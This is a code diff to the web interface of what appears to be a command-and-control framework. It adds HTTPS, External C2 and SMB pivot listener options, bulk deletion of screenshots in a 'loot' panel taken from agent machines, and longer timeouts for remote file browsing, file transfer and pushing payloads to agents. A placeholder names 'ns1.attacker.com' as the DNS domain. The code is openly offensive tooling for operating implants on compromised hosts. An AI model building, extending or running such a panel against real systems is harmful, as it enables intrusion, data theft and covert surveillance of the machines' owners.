@@ -124,7 +124,8 @@ tr.selected td{background:rgba(0,212,255,.06)}
 .console-err{color:var(--red);white-space:pre}
 .console-section{color:var(--green);font-weight:700}
 /* ── Screenshot cards ── */
-.ss-card{background:var(--bg3);border:1px solid var(--border);border-radius:6px;overflow:hidden}
+.ss-card{background:var(--bg3);border:1px solid var(--border);border-radius:6px;overflow:hidden;transition:border-color .15s}
+.ss-card-selected{border-color:var(--accent)!important;box-shadow:0 0 0 1px var(--accent)}
 .ss-card-header{padding:6px 8px;font-size:10px;color:var(--text2);border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;white-space:nowrap;overflow:hidden}
 .ss-img{width:100%;display:block;cursor:zoom-in;object-fit:contain;max-height:160px;background:var(--bg4);border-bottom:1px solid var(--border)}
 .ss-card-footer{padding:6px 8px;display:flex;gap:6px}
@@ -1230,10 +1231,12 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
         </div>
         <!-- Screenshots -->
         <div class="sub-panel" id="sub-loot-screenshots">
-          <div style="display:flex;gap:8px;margin-bottom:10px;align-items:center">
+          <div style="display:flex;gap:8px;margin-bottom:10px;align-items:center;flex-wrap:wrap">
             <select id="ss-agent" style="width:200px" onchange="renderScreenshots()"><option value="">— All agents —</option></select>
             <button class="btn btn-ghost btn-sm" onclick="captureScreenshot()">📷 Capture</button>
             <button class="btn btn-ghost btn-sm" onclick="loadScreenshots()">↻ Refresh</button>
+            <button class="btn btn-ghost btn-sm" onclick="ssSelectAll()">☑ Select All</button>
+            <button id="ss-del-btn" class="btn btn-danger btn-sm" style="display:none" onclick="ssDeleteSelected()">🗑 Delete Selected (<span id="ss-sel-count">0</span>)</button>
           </div>
           <div id="ss-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;padding:4px"></div>
         </div>
@@ -1979,10 +1982,13 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
         <label>Protocol</label>
         <select id="lst-proto" onchange="listenerProtoChange()">
           <option value="http">HTTP</option>
+          <option value="https">HTTPS</option>
           <option value="mtls">mTLS</option>
           <option value="tcp">TCP</option>
           <option value="wstunnel">WS Tunnel</option>
           <option value="dns">DNS</option>
+          <option value="extc2">External C2</option>
+          <option value="smb">SMB (info)</option>
         </select>
       </div>
       <div class="form-row">
@@ -1992,6 +1998,13 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
       <div class="form-row" id="lst-domain-row" style="display:none">
         <label>Domain (for DNS)</label>
         <input id="lst-domain" placeholder="ns1.attacker.com">
+      </div>
+      <div class="form-row" id="lst-secret-row" style="display:none">
+        <label>Shared Secret</label>
+        <input id="lst-secret" placeholder="random-key-for-channel-auth">
+      </div>
+      <div id="lst-smb-note" style="display:none;color:var(--text3);font-size:11px;padding:6px 0;line-height:1.5">
+        SMB pivot is agent-side only. Generate an <b>SMB Pipe Pivot</b> agent in the Payloads tab and deploy it on a machine you already own — it relays traffic through a named pipe to an existing agent.
       </div>
     </div>
     <div class="modal-footer">
@@ -2738,7 +2751,7 @@ async function refreshProcessList() {
   const wrap = document.getElementById('ps-table-wrap');
   wrap.innerHTML = '<div style="padding:20px;color:var(--text3);font-family:var(--font-mono)">Waiting for agent…</div>';
   try {
-    const resp = await fetch(`/browse/ps?agent=${psAgentId}&timeout=60`, {
+    const resp = await fetch(`/browse/ps?agent=${psAgentId}&timeout=300`, {
       headers: {'Authorization': 'Bearer ' + (TOKEN || window.__GUI_TOKEN__)}
     });
     const data = await resp.json();
@@ -2868,6 +2881,52 @@ function populateSsAgentFilter() {
   sel.value = cur;
 }
 
+let ssSelected = new Set(); // key = "agentId|filename"
+
+function ssKey(f) { return (f.agent_id||'') + '|' + f.filename; }
+
+function ssToggle(key, el) {
+  if (ssSelected.has(key)) { ssSelected.delete(key); el.classList.remove('ss-card-selected'); }
+  else { ssSelected.add(key); el.classList.add('ss-card-selected'); }
+  ssUpdateDelBtn();
+}
+
+function ssUpdateDelBtn() {
+  const btn = document.getElementById('ss-del-btn');
+  const cnt = document.getElementById('ss-sel-count');
+  if (!btn) return;
+  cnt.textContent = ssSelected.size;
+  btn.style.display = ssSelected.size ? '' : 'none';
+}
+
+function ssSelectAll() {
+  const filterAgent = document.getElementById('ss-agent').value;
+  let items = screenshots;
+  if (filterAgent) items = items.filter(f => f.agent_id === filterAgent);
+  items.forEach(f => ssSelected.add(ssKey(f)));
+  document.querySelectorAll('.ss-card').forEach(c => c.classList.add('ss-card-selected'));
+  ssUpdateDelBtn();
+}
+
+async function ssDeleteSelected() {
+  if (!ssSelected.size) return;
+  if (!confirm(`Delete ${ssSelected.size} screenshot(s)?`)) return;
+  const keys = [...ssSelected];
+  ssSelected.clear();
+  ssUpdateDelBtn();
+  let ok = 0, fail = 0;
+  await Promise.all(keys.map(async key => {
+    const [agentId, filename] = key.split('|');
+    const path = agentId ? `${encodeURIComponent(agentId)}/${encodeURIComponent(filename)}` : encodeURIComponent(filename);
+    try {
+      const r = await api('DELETE', `/api/dl/${path}`);
+      if (r?.ok) ok++; else fail++;
+    } catch { fail++; }
+  }));
+  toast(`Deleted ${ok}${fail?' ('+fail+' failed)':''}`, fail ? 'red' : 'green');
+  await loadScreenshots();
+}
+
 function renderScreenshots() {
   const filterAgent = document.getElementById('ss-agent').value;
   const grid = document.getElementById('ss-grid');
@@ -2883,21 +2942,24 @@ function renderScreenshots() {
     const url  = `${BASE}/api/dl/${path}?token=${TOKEN}`;
     const a    = agents.find(x => x.id === f.agent_id);
     const who  = a ? a.hostname : (f.agent_id||'?').substring(0,8);
-    return `<div class="ss-card">
+    const key  = ssKey(f);
+    const sel  = ssSelected.has(key);
+    return `<div class="ss-card${sel?' ss-card-selected':''}" onclick="ssToggle('${esc(key)}',this)" style="cursor:pointer;position:relative">
       <div class="ss-card-header">
         <span title="${esc(f.agent_id||'')}">${esc(who)}</span>
         <span style="color:var(--text3)">${relTime(f.created_at)}</span>
       </div>
-      <a href="${url}" target="_blank">
+      <a href="${url}" target="_blank" onclick="event.stopPropagation()">
         <img class="ss-img" src="${url}" alt="screenshot" loading="eager" onerror="this.style.opacity='0.3';this.title='Load error'">
       </a>
       <div class="ss-card-footer">
-        <a class="btn btn-ghost btn-sm" href="${url}" download="${esc(f.filename)}" style="font-size:10px">⬇ Download</a>
+        <a class="btn btn-ghost btn-sm" href="${url}" download="${esc(f.filename)}" style="font-size:10px" onclick="event.stopPropagation()">⬇ Download</a>
         <span style="color:var(--text3);font-size:10px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin:0 6px">${esc(f.filename)}</span>
-        <button class="btn btn-danger btn-sm" style="font-size:10px;padding:2px 7px" onclick="delUpload('${esc(f.agent_id||'')}','${esc(f.filename)}')">🗑</button>
+        <button class="btn btn-danger btn-sm" style="font-size:10px;padding:2px 7px" onclick="event.stopPropagation();delUpload('${esc(f.agent_id||'')}','${esc(f.filename)}')">🗑</button>
       </div>
     </div>`;
   }).join('');
+  ssUpdateDelBtn();
 }
 
 async function captureScreenshot() {
@@ -4236,6 +4298,7 @@ const TRANSPORT_STYLES = {
   'tcp':     { label:'TCP',      color:'#38bdf8', dash:null },
   'dns':     { label:'DNS',      color:'#fb923c', dash:'6 3' },
   'dns-txt': { label:'DNS-TXT',  color:'#fbbf24', dash:'6 3' },
+  'extc2':   { label:'ExtC2',   color:'#f97316', dash:'4 4' },
 };
 function edgeColor(transport, isDead) {
   return isDead ? '#e83030' : transportColor(transport);
@@ -8527,16 +8590,26 @@ function renderListeners() {
 
 function listenerProtoChange() {
   const proto = document.getElementById('lst-proto').value;
-  document.getElementById('lst-domain-row').style.display = proto === 'dns' ? '' : 'none';
-  document.getElementById('lst-port').value = {http:'8080',mtls:'8443',tcp:'4444',wstunnel:'40000',dns:'53'}[proto] || '8080';
+  document.getElementById('lst-domain-row').style.display  = proto === 'dns'   ? '' : 'none';
+  document.getElementById('lst-secret-row').style.display  = proto === 'extc2' ? '' : 'none';
+  document.getElementById('lst-smb-note').style.display    = proto === 'smb'   ? '' : 'none';
+  const ports = {http:'8080',https:'8444',mtls:'8443',tcp:'4444',wstunnel:'40000',dns:'53',extc2:'9090'};
+  document.getElementById('lst-port').value = ports[proto] || '8080';
+  // SMB is informational only — hide port and start button
+  document.getElementById('lst-port').closest('.form-row').style.display = proto === 'smb' ? 'none' : '';
+  document.querySelector('#modal-listener .modal-footer .btn-primary').style.display = proto === 'smb' ? 'none' : '';
 }
 
 async function startListener() {
   const proto = document.getElementById('lst-proto').value;
+  if (proto === 'smb') return; // SMB is agent-side only
   const port = parseInt(document.getElementById('lst-port').value);
   const domain = document.getElementById('lst-domain').value.trim();
+  const secret = document.getElementById('lst-secret').value.trim();
   const body = {proto, port};
   if (domain) body.domain = domain;
+  if (secret) body.secret = secret;
+  if (proto === 'extc2' && !secret) { toast('Secret required for External C2', 'red'); return; }
   const r = await api('POST', '/api/jobs', body);
   if (r.ok) {
     toast('Listener started on :' + port, 'green');
@@ -10518,7 +10591,7 @@ function closeFxTab() {
   showTab('agents');
 }
 
-async function fxWaitTask(agentId, taskId, maxMs=30000) {
+async function fxWaitTask(agentId, taskId, maxMs=300000) {
   const deadline = Date.now() + maxMs;
   while (Date.now() < deadline) {
     await sleep(1200);
@@ -10593,7 +10666,7 @@ async function fxList(path) {
   fxSetStatus('Loading...');
   document.getElementById('fx-table').innerHTML = '<div style="padding:24px;color:var(--text3);text-align:center">Loading...</div>';
   try {
-    const resp = await fetch(`/browse/ls?agent=${fxAgentId}&path=${encodeURIComponent(path)}&timeout=60`, {
+    const resp = await fetch(`/browse/ls?agent=${fxAgentId}&path=${encodeURIComponent(path)}&timeout=300`, {
       headers: {'Authorization': 'Bearer ' + (TOKEN || window.__GUI_TOKEN__)}
     });
     const data = await resp.json();
@@ -10670,7 +10743,7 @@ async function fxDownload(remotePath) {
   fxSetStatus('Downloading ' + remotePath + '...');
   const r = await api('POST', `/api/agents/${fxAgentId}/task`, {type:'DOWNLOAD', args:JSON.stringify({path:remotePath})});
   if (!r?.ok) { fxSetStatus('Download task failed'); return; }
-  const res = await fxWaitTask(fxAgentId, r.data.task_id, 60000);
+  const res = await fxWaitTask(fxAgentId, r.data.task_id, 300000);
   if (!res) { fxSetStatus('Timeout'); return; }
   if (res.error) { fxSetStatus('Error: '+res.error); return; }
   const fname = remotePath.split(/[/\\]/).pop();
@@ -10772,7 +10845,7 @@ async function fxHandleFileUpload(input) {
       args: JSON.stringify({filename: file.name, remote_path: remotePath}),
     });
     if (!r?.ok) { fxSetStatus('UPLOAD task failed'); return; }
-    const res = await fxWaitTask(fxAgentId, r.data.task_id, 60000);
+    const res = await fxWaitTask(fxAgentId, r.data.task_id, 300000);
     if (res?.error) { fxSetStatus('Error: ' + res.error); return; }
     fxSetStatus(`Uploaded: ${remotePath}`);
     toast('Uploaded: ' + file.name);
@@ -10845,7 +10918,7 @@ async function fxPushPayload(filename) {
     args: JSON.stringify({filename, remote_path: remotePath}),
   });
   if (!r?.ok) { fxSetStatus('UPLOAD task failed'); return; }
-  const res = await fxWaitTask(fxAgentId, r.data.task_id, 60000);
+  const res = await fxWaitTask(fxAgentId, r.data.task_id, 300000);
   if (res?.error) { fxSetStatus('Error: ' + res.error); return; }
   fxSetStatus(`Pushed: ${remotePath}`);
   toast('Pushed: ' + filename);
